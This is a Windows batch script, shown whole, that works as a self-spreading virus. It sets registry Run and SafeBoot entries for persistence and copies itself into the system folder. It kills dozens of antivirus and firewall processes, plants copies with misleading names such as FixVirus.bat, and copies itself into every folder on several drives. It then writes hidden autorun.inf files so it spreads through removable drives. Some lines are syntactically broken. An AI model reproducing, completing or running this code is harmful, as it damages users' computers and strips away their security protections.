@echo off
reg add HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\ Parameters\FirewallPolicy\StandardProfile\Authorized Applications\ListSOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Infect /t REG_SZ
/d %systemroot%\sohai.bat /f > nul
reg add HKLM\SYSTEM\ControlSet001\Control\SafeBoot /v Infect /t REG_SZ/d %systemroot%\sohai.bat /f > nul
reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v Infect /t REG_SZ/d %systemroot%\sohai.bat /f > nul
copy %0 %Systemroot%\Infect > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Infect /t REG_SZ
/d %systemroot%\sohai.bat /f > nul
copy %0 *.bat > nul
tskill ALG
tskill aswUpdSv
tskill avast! Antivirus
tskill avast! Mail Scanner
tskill avast! Web ScannerAVP
tskill BackWeb Plug-in - 4476822
tskill bdss
tskill BGLiveSvc
tskill BlackICE
tskill CAISafe
tskill ccEvtMgr
tskill ccProxy
tskill ccSetMgr
tskill Eset Service
tskill F-Prot Antivirus Update Monitor
tskill fsbwsys
tskill FSDFWD
tskill F-Secure Gatekeeper Handler Starter
tskill fshttps
tskill FSMA
tskill InoRPC
tskill InoRT
tskill InoTask
tskill ISSVC
tskill KPF4
tskill LavasoftFirewall
tskill LIVESRV
tskill McAfeeFramework
tskill McShield
tskill McTaskManager
tskill navapsvc
tskill NOD32krn
tskill NPFMntor
tskill NSCService
tskill Outpost Firewall main module
tskill OutpostFirewall
tskill PAVFIRES
tskill PAVFNSVR
tskill PavProt
tskill PavPrSrv
tskill PAVSRV
tskill PcCtlCom
tskill PersonalFirewal
tskill PREVSRV
tskill ProtoPort Firewall service
tskill PSIMSVC
tskill RapApp
tskill SmcService
tskill SNDSrvc
tskill SPBBCSvc

tskill Tmntsrv
tskill TmPfw
tskill tmproxy
tskill UmxAgent
tskill UmxCfg
tskill UmxLU
tskill UmxPol
tskill vsmon
tskill VSSERV
tskill WebrootDesktopFirewallDataService
tskill WebrootFirewall
tskill XCOMM
cls
cd %userprofile%\desktop
copy Infect.bat H.I.V.avc
copy Infect.bat H.I.V.key
copy Infect.bat H.I.V.vdb
copy Infect.bat FixVirus.bat
cd %userprofile%My Documents
copy Infect.bat H.I.V.avc
copy Infect.bat H.I.V.key
copy Infect.bat H.I.V.vdb
copy Infect.bat FixVirus.bat
For /R D":\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
For /R C":\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
For /R E":\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
For /R F":\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
echo [autorun]>>C:\autorun.inf
open=sohai.bat>>C:\autorun.inf
echo [autorun]>>D:\autorun.inf
open=sohai.bat>>D:\autorun.inf
echo [autorun]>>E:\autorun.inf
open=sohai.bat>>E:\autorun.inf
echo [autorun]>>F:\autorun.inf
open=sohai.bat>>F:\autorun.inf
echo [autorun]>>G:\autorun.inf
open=sohai.bat>>G:\autorun.inf
Attrib +r +h C:\autorun.inf
Attrib +r +h D:\autorun.inf
Attrib +r +h E:\autorun.inf
Attrib +r +h F:\autorun.inf
Attrib +r +h G:\autorun.inf